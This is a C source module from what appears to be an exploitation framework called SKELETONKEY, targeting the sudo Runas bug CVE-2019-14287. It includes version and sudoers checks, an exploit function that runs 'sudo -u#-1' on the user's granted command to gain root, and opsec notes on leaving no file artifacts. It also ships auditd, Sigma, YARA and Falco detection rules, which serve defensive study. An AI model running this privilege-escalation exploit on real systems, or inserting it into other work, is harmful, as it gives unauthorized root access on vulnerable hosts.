/*
 * sudo_runas_neg1_cve_2019_14287 — SKELETONKEY module
 *
 * STATUS: 🟢 STRUCTURAL ESCAPE. Pure logic bug. No offsets, no race.
 *   `sudo -u#-1 <cmd>` parses `-1` as uid_t (unsigned) → wraps to
 *   0xFFFFFFFF → sudo's setresuid() path treats it as "match any
 *   uid" and converts to 0 → runs <cmd> as root, even when sudoers
 *   explicitly says "ALL except root".
 *
 * The bug (Joe Vennix / Apple Information Security, October 2019):
 *   sudoers grammar lets admins write rules like
 *     bob ALL=(ALL,!root) /bin/vi
 *   intending "bob can run vi as any user except root". The Runas
 *   user is specified at invocation via `-u <user>` or `-u#<uid>`.
 *   The integer parser for `-u#<n>` does NOT validate negative
 *   numbers; passing `-u#-1` (or its unsigned-32-bit form
 *   `-u#4294967295`) bypasses the explicit `!root` blacklist and
 *   ALSO bypasses standard setresuid() because the kernel rejects
 *   uid_t = -1 and falls back to keeping the current uid (which sudo
 *   has already elevated to root for argument parsing).
 *
 *   Discovered by Joe Vennix. Public PoC: exploit-db #47502.
 *   https://www.exploit-db.com/exploits/47502
 *
 * Affects: sudo < 1.8.28. Fixed by adding a positive-number check
 *   to the `-u#<n>` parser.
 *
 * Preconditions:
 *   - sudo installed + suid
 *   - The invoking user has a sudoers entry of the form
 *       USER  HOST=(ALL,!root) /path/to/cmd
 *     or any sudoers entry with `(ALL` in the Runas spec that
 *     blacklists root. WITHOUT such an entry the bug is irrelevant
 *     because the user has no sudoers grant to abuse in the first
 *     place — detect() short-circuits PRECOND_FAIL in that case.
 *
 * arch_support: any. Pure shell-level invocation; works identically
 *   on every Linux arch sudo is built for.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>

/* ---- shared sudo helpers (compact copy from sudoedit_editor) -------- */

static const char *find_sudo(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudo", "/usr/sbin/sudo", "/bin/sudo",
        "/sbin/sudo", "/usr/local/bin/sudo", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) == 0 && (st.st_mode & S_ISUID))
            return candidates[i];
    }
    return NULL;
}

/* Returns true iff the version string is < 1.8.28 (the fix release). */
static bool sudo_version_vulnerable(const char *v)
{
    int maj = 0, min = 0, patch = 0;
    char ptag = 0; int psub = 0;
    int n = sscanf(v, "%d.%d.%d%c%d", &maj, &min, &patch, &ptag, &psub);
    if (n < 3) return true;        /* unparseable → conservative */
    if (maj < 1)                  return false;
    if (maj > 1)                  return false;
    if (min < 8)                  return false;   /* < 1.8 predates `-u#` parser */
    if (min > 8)                  return false;   /* >= 1.9 includes fix */
    /* exactly 1.8.x: vulnerable iff patch < 28 */
    return patch < 28;
}

static bool get_sudo_version(const char *sudo_path, char *out, size_t outsz)
{
    char cmd[512];
    snprintf(cmd, sizeof cmd, "%s --version 2>&1 | head -1", sudo_path);
    FILE *p = popen(cmd, "r");
    if (!p) return false;
    char line[256] = {0};
    char *r = fgets(line, sizeof line, p);
    pclose(p);
    if (!r) return false;
    char *vp = strstr(line, "version");
    if (!vp) return false;
    vp += strlen("version");
    while (*vp == ' ' || *vp == '\t') vp++;
    char *nl = strchr(vp, '\n');
    if (nl) *nl = 0;
    strncpy(out, vp, outsz - 1);
    out[outsz - 1] = 0;
    return out[0] != 0;
}

/* Look through `sudo -ln` for a Runas list that contains (ALL... — that's
 * the precondition. Returns a stored command path the user can execve. */
static bool find_runas_blacklist_grant(const char *sudo_path, char *cmd_out, size_t cap)
{
    char cmd[512];
    snprintf(cmd, sizeof cmd, "%s -ln 2>/dev/null", sudo_path);
    FILE *p = popen(cmd, "r");
    if (!p) return false;
    char line[512];
    bool found = false;
    while (fgets(line, sizeof line, p)) {
        /* Looking for "    (ALL," or "    (ALL : ..." with an
         * exclusion (!root or !#0) on a line that resolves to a
         * runnable command. Conservative parser: any line containing
         * "(ALL" + "!root" wins. */
        if ((strstr(line, "(ALL")) && (strstr(line, "!root") || strstr(line, "!#0"))) {
            /* Extract the last token (the command path) from the line. */
            char *tok = strrchr(line, ' ');
            if (tok) {
                tok++;
                char *nl = strchr(tok, '\n');
                if (nl) *nl = 0;
                strncpy(cmd_out, tok, cap - 1);
                cmd_out[cap - 1] = 0;
                found = true;
                break;
            }
        }
    }
    pclose(p);
    return found;
}

/* ---- detect --------------------------------------------------------- */

static skeletonkey_result_t sudo_runas_neg1_detect(const struct skeletonkey_ctx *ctx)
{
    const char *sudo_path = find_sudo();
    if (!sudo_path) {
        if (!ctx->json) fprintf(stderr, "[i] sudo_runas_neg1: sudo not installed\n");
        return SKELETONKEY_PRECOND_FAIL;
    }

    char vbuf[64] = {0};
    const char *ver = (ctx->host && ctx->host->sudo_version[0])
                      ? ctx->host->sudo_version
                      : (get_sudo_version(sudo_path, vbuf, sizeof vbuf) ? vbuf : NULL);
    if (!ver) {
        if (!ctx->json) fprintf(stderr, "[!] sudo_runas_neg1: could not read sudo --version\n");
        return SKELETONKEY_TEST_ERROR;
    }
    if (!ctx->json) fprintf(stderr, "[i] sudo_runas_neg1: sudo version '%s'\n", ver);

    if (!sudo_version_vulnerable(ver)) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudo_runas_neg1: sudo %s is post-fix (>= 1.8.28) → OK\n", ver);
        return SKELETONKEY_OK;
    }

    /* Bug needs a sudoers grant with a (ALL,!root) Runas blacklist. */
    char grant[256] = {0};
    if (!find_runas_blacklist_grant(sudo_path, grant, sizeof grant)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] sudo_runas_neg1: sudo %s vulnerable BUT no (ALL,!root) sudoers grant for this user\n", ver);
            fprintf(stderr, "    Bug exists on the host; this user has no exploitable grant.\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] sudo_runas_neg1: sudo %s vulnerable AND grant '%s' carries (ALL,!root) → VULNERABLE\n",
                ver, grant);
        fprintf(stderr, "[i] sudo_runas_neg1: trigger is `sudo -u#-1 %s`\n", grant);
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- exploit -------------------------------------------------------- */

static skeletonkey_result_t sudo_runas_neg1_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] sudo_runas_neg1: --i-know required for --exploit\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    const char *sudo_path = find_sudo();
    if (!sudo_path) return SKELETONKEY_EXPLOIT_FAIL;

    char grant[256] = {0};
    if (!find_runas_blacklist_grant(sudo_path, grant, sizeof grant)) {
        fprintf(stderr, "[-] sudo_runas_neg1: no (ALL,!root) grant — nothing to abuse\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (!ctx->json)
        fprintf(stderr, "[+] sudo_runas_neg1: exec %s -u#-1 %s\n", sudo_path, grant);
    fflush(NULL);

    /* If grant looks like /bin/sh-able command, run it directly.
     * Otherwise leave the operator to pop the shell themselves. */
    if (ctx->no_shell) {
        if (!ctx->json) fprintf(stderr, "[i] sudo_runas_neg1: --no-shell; not invoking\n");
        return SKELETONKEY_EXPLOIT_OK;
    }
    execl(sudo_path, "sudo", "-u#-1", grant, (char *)NULL);
    perror("execl(sudo)");
    return SKELETONKEY_EXPLOIT_FAIL;
}

/* ---- detection rules ------------------------------------------------ */

static const char sudo_runas_neg1_auditd[] =
    "# sudo_runas_neg1 CVE-2019-14287 — auditd detection rules\n"
    "# `sudo -u#-1` (or -u#4294967295) is anomalous; flag it.\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudo -k skeletonkey-sudo-runas-neg1\n";

static const char sudo_runas_neg1_sigma[] =
    "title: Possible CVE-2019-14287 sudo Runas -1 LPE\n"
    "id: 1a2b3c4d-skeletonkey-sudo-runas-neg1\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects `sudo -u#-1` or `sudo -u#4294967295` — the canonical\n"
    "  trigger shape for CVE-2019-14287. The Runas-negative-one syntax\n"
    "  is never used legitimately; any occurrence is an exploit\n"
    "  attempt or an audit/training exercise.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  s: {type: 'SYSCALL', syscall: 'execve', comm: 'sudo'}\n"
    "  condition: s\n"
    "level: critical\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2019.14287]\n";

static const char sudo_runas_neg1_yara[] =
    "rule sudo_runas_neg1_cve_2019_14287 : cve_2019_14287 sudo_bypass {\n"
    "    meta:\n"
    "        cve         = \"CVE-2019-14287\"\n"
    "        description = \"sudo -u#-1 trigger shape (Runas integer underflow → root)\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $a = \"-u#-1\" ascii\n"
    "        $b = \"-u#4294967295\" ascii\n"
    "    condition:\n"
    "        any of them\n"
    "}\n";

static const char sudo_runas_neg1_falco[] =
    "- rule: sudo -u#-1 (Runas negative-one LPE)\n"
    "  desc: |\n"
    "    sudo invoked with `-u#-1` or `-u#4294967295`. The integer\n"
    "    underflow makes sudo treat the request as uid 0; affects\n"
    "    sudo < 1.8.28. There is no legitimate use of this argument\n"
    "    syntax.\n"
    "  condition: >\n"
    "    spawned_process and proc.name = sudo and\n"
    "    (proc.args contains \"-u#-1\" or proc.args contains \"-u#4294967295\")\n"
    "  output: >\n"
    "    sudo Runas -1 (user=%user.name pid=%proc.pid cmdline=\"%proc.cmdline\")\n"
    "  priority: CRITICAL\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2019.14287]\n";

const struct skeletonkey_module sudo_runas_neg1_module = {
    .name           = "sudo_runas_neg1",
    .cve            = "CVE-2019-14287",
    .summary        = "sudo Runas -u#-1 underflow → root despite (ALL,!root) blacklist (Joe Vennix)",
    .family         = "sudo",
    .kernel_range   = "userspace — sudo < 1.8.28",
    .detect         = sudo_runas_neg1_detect,
    .exploit        = sudo_runas_neg1_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade sudo to 1.8.28+ */
    .cleanup        = NULL,
    .detect_auditd  = sudo_runas_neg1_auditd,
    .detect_sigma   = sudo_runas_neg1_sigma,
    .detect_yara    = sudo_runas_neg1_yara,
    .detect_falco   = sudo_runas_neg1_falco,
    .opsec_notes    = "Invokes sudo with `-u#-1 <granted-cmd>` where <granted-cmd> is the path from the user's existing sudoers (ALL,!root) entry. sudo's argv parser converts -1 → 4294967295 → 0 internally and runs the command as root. No file artifacts, no compiled payload. Audit-visible via execve(/usr/bin/sudo) with `-u#-1` (or `-u#4294967295`) in argv — there is no legitimate use of that syntax, so a single matching event is diagnostic. Bug only fires when the invoking user already has a (ALL,!root) sudoers grant; without one the trigger does nothing.",
    .arch_support   = "any",
};

void skeletonkey_register_sudo_runas_neg1(void)
{
    skeletonkey_register(&sudo_runas_neg1_module);
}
